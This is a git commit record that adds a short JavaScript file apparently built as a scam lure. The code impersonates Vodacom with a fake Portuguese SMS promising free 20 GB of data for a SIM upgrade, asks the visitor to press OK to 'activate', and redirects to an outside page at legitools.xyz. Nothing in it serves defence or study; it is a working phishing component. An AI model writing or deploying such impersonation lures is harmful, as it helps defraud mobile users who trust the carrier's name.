2c92dedf84a080db78d4210cb9d824bfc8c109c7
katemj25 <mbokofficial1@gmail.com>
2025-07-22 22:17:52 -0700

    Create activate-vodacom-20gb.com.js

---
+++ activate-vodacom-20gb.com.js
@@ -0,0 +1,5 @@
+var password = 'Bônus de 20 GB grátis'
+password=prompt('SMS: Parabéns VODACOM está oferecendo dados grátis para todos os novos bônus de atualização do cartão SIM, Por favor, pressione OK para ATIVAR. ','Bônus de 20 GB grátis');
+if (password != 'Bônus de 20 GB grátis') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
